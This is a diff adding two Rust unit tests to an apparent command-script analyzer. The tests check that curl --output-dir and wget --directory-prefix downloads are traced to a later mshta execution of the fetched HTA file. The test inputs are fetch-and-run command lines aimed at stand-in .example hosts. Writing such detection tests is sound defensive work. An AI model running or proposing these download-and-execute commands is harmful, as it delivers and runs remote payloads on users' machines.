@@ -10587,6 +10587,41 @@ mshta C:\Temp\stage.hta"#,
     }
 
     #[test]
+    fn curl_slash_output_dir_applies_to_relative_output_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl --output-dir C:/Temp -o stage.hta https://curl-slash-output-dir-o.example/payload.hta
+mshta C:/Temp/stage.hta"#,
+            &Config::default(),
+        );
+        let has_download_dst = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: Some(dst), .. }
+                    if src == "https://curl-slash-output-dir-o.example/payload.hta"
+                        && dst == "C:/Temp/stage.hta"
+            )
+        });
+        assert!(
+            has_download_dst,
+            "curl slash --output-dir did not join relative -o destination: {:?}",
+            report.traits
+        );
+        let has_resolved_mshta = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta C:/Temp/stage.hta"
+                        && url == "https://curl-slash-output-dir-o.example/payload.hta"
+            )
+        });
+        assert!(
+            has_resolved_mshta,
+            "mshta slash path did not resolve curl output-dir download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn curl_without_output_records_src_only() {
         let mut env = Environment::new(&Config::default());
         interpret_line("curl http://x/y", &mut env);
@@ -11029,6 +11064,41 @@ mshta payload.hta"#,
         assert!(
             has,
             "mshta local HTA did not resolve wget directory-prefix download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn wget_slash_directory_prefix_tracks_url_basename_for_later_execution() {
+        let report = crate::analyze(
+            br#"wget --directory-prefix C:/Temp https://wget-slash-prefix-mshta.example/payload.hta
+mshta C:/Temp/payload.hta"#,
+            &Config::default(),
+        );
+        let has_download_prefix = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, dst: Some(dst), .. }
+                    if src == "https://wget-slash-prefix-mshta.example/payload.hta"
+                        && dst == "C:/Temp"
+            )
+        });
+        assert!(
+            has_download_prefix,
+            "wget slash directory-prefix did not record destination prefix: {:?}",
+            report.traits
+        );
+        let has_resolved_mshta = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "mshta C:/Temp/payload.hta"
+                        && url == "https://wget-slash-prefix-mshta.example/payload.hta"
+            )
+        });
+        assert!(
+            has_resolved_mshta,
+            "mshta slash path did not resolve wget directory-prefix download source: {:?}",
             report.traits
         );
     }
